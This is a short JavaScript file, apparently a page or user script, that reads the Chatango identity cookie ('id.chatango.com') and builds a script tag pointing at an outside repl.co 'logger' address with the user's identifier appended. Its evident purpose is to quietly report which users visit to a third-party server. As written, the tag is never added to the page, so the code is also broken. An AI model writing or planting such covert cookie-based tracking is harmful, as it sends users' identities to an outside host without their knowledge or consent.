const CHATANGO_COOKIE_ID = "id.chatango.com";

class Utilities {

    constructor() {
        throw Error('A static class cannot be instantiated.');
    }

    static GetCookie(name) {
        const matches = document.cookie.match(new RegExp(
          "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));

        return matches ? decodeURIComponent(matches[1]) : undefined;
    }

}

class Logger {

    #chatangoUser = "anon";

    constructor() {
        this.#chatangoUser = Utilities.GetCookie(CHATANGO_COOKIE_ID) ?? "anon";

        this.LogUser();
    }

    
    LogUser() {
        // make some request ig
        const script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = "https://vlogger.jackbarnett3.repl.co/logger/" + this.#chatangoUser;
    }

}


// Init
new Logger();